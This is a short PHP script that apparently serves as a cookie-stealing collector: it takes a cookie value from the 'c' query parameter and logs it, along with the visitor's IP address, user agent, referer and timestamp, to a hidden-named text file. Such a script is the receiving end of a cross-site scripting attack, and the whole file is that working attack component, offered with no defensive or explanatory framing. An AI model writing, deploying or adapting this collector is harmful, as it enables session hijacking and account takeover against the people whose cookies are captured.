<?php

if (isset($_GET['c'])) $cookie = $_GET['c']; else exit;

$log = 'secretcookielog9977.txt';

$d = date('Y-m-d H:i:s');
$ua = $_SERVER['HTTP_USER_AGENT'];
$ip_addr = $_SERVER['REMOTE_ADDR'];
$referer = $_SERVER['HTTP_REFERER'];

$f = fopen($log, 'a+');
fputs($f, "Date: $d | IP: $ip_addr | UA: $ua | Referer: $referer\r\nCookies: $cookie\r\n\r\n");
fclose($f);

?>
